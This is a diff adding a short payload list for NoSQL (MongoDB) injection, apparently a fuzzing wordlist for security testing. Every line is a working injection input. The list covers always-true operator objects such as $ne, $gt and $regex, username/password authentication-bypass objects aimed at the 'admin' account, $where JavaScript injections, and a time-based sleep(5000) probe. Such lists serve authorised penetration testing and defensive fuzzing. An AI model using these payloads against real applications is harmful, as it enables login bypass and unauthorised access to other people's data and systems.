@@ -1,0 +1,21 @@
+{"$ne": null}
+{"$gt": ""}
+{"$gte": ""}
+{"$lt": ""}
+{"$lte": ""}
+{"$in": []}
+{"$nin": []}
+{"$exists": true}
+{"$regex": "^.*$"}
+{"$regex": ".*"}
+{"$where": "1==1"}
+{"$where": "function() { return true }"}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}
+{"$and": [{"username": "admin"}, {"password": {"$regex": "^.*$"}}]}
+{"username": {"$regex": "admin.*"}}
+{"password": {"$regex": "^.{1,}$"}}
+{"$where": "this.username == 'admin'"}
+{"$where": "this.password.length > 0"}
+{"$where": "sleep(5000)"}
